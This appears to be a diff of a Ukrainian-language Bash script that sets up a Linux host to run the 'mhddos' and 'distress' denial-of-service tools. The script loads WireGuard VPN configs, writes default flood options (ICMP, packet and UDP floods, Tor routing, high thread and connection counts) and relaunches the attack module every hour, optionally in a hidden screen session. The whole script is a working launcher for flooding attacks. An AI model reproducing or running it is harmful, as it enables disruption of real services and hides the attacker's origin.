@@ -2,7 +2,7 @@
 
 set -e
 
-#=== Підготовка середовища для будь-якого Linux ===
+#=== Підготовка середовища ===
 
 echo "[+] Перевірка користувача..."
 if [ "$(id -u)" -eq 0 ]; then
@@ -13,7 +13,7 @@ else
         SUDO="sudo"
         echo "[+] sudo доступний."
     else
-        echo "[-] sudo не знайдено. Встановіть або увійдіть як root."
+        echo "[-] sudo не знайдено. Потрібно встановити або увійти як root."
         exit 1
     fi
 fi
@@ -40,7 +40,7 @@ else
     exit 1
 fi
 
-echo "[+] Оновлення системи і встановлення необхідних пакетів..."
+echo "[+] Оновлення системи і встановлення пакетів..."
 $UPDATE_CMD
 $INSTALL_CMD curl wget git screen sed
 
@@ -68,7 +68,7 @@ $SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
 #=== Перевірка наявності WG-конфігів ===
 echo "[+] Перевірка наявності WG конфігів..."
 if ! compgen -G "$WG_DIR/*.conf" > /dev/null; then
-    echo "[-] Не знайдено жодного WG конфігу. Перевірте підключення до GitHub або репозиторій!"
+    echo "[-] Жодного WG-конфігу не знайдено. Перевірте репозиторій!"
     exit 1
 fi
 
@@ -109,9 +109,9 @@ case $module_choice in
         ;;
 esac
 
-#=== Підготовка конфігу INI ===
-echo "[+] Підготовка налаштувань для $MODULE_NAME..."
-echo "[?] Бажаєте редагувати параметри модуля вручну через nano? (y/n)"
+#=== Підготовка INI конфігурації ===
+echo "[+] Підготовка INI файлу..."
+echo "[?] Бажаєте відредагувати параметри модуля через nano? (y/n)"
 read -r edit_ini
 
 if [[ $edit_ini == "y" ]]; then
@@ -119,7 +119,7 @@ if [[ $edit_ini == "y" ]]; then
 else
     echo "[+] Використовуємо базові налаштування."
     if [[ "$MODULE_NAME" == "mhddos" ]]; then
-        echo "--use-my-ip 0 --copies auto -t 8000" > "$CONFIG_FILE"
+        echo "--use-my-ip 0 --copies auto -t 8000 --user-id=*********" > "$CONFIG_FILE"
     elif [[ "$MODULE_NAME" == "distress" ]]; then
         echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$CONFIG_FILE"
     fi
@@ -130,16 +130,17 @@ ARGS=$(cat "$CONFIG_FILE")
 #=== Вибір способу запуску ===
 RUN_MODE_FILE="$HOME/last_run_mode.txt"
 if [[ ! -s "$RUN_MODE_FILE" ]]; then
-    echo "[?] Виберіть спосіб запуску:"
+    echo "[?] Виберіть спосіб запуску модуля:"
     echo "1 - screen у фоні"
-    echo "2 - без screen у терміналі"
-    read -p "[1/2]: " run_mode
+    echo "2 - screen з виводом"
+    echo "3 - без screen у поточному терміналі"
+    read -p "[1/2/3]: " run_mode
     echo "$run_mode" > "$RUN_MODE_FILE"
 else
     run_mode=$(cat "$RUN_MODE_FILE")
 fi
 
-#=== Основний цикл запуску ===
+#=== Основний цикл перезапуску ===
 while true; do
     echo "[+] Очікування до наступної години..."
     SLEEP_SEC=$((3600 - $(date +%M)*60 - $(date +%S)))
@@ -165,12 +166,13 @@ while true; do
 
     echo "[+] Запуск модуля..."
     if [[ $run_mode == "1" ]]; then
-        screen -dmS "$MODULE_NAME" $MODULE $ARGS
+        screen -dmS "$MODULE_NAME" bash -c "$MODULE $(cat "$CONFIG_FILE")"
     elif [[ $run_mode == "2" ]]; then
-        $MODULE $ARGS
+        screen -S "$MODULE_NAME" bash -c "$MODULE $(cat "$CONFIG_FILE")"
+    elif [[ $run_mode == "3" ]]; then
+        bash -c "$MODULE $(cat "$CONFIG_FILE")"
     fi
 
-    echo "[+] Логування запуску..."
-    echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Модуль перезапущено успішно." >> "$LOG_DIR/kaljan.log"
-
+    echo "[+] Логування перезапуску..."
+    echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Перезапуск виконано." >> "$LOG_DIR/kaljan.log"
 done
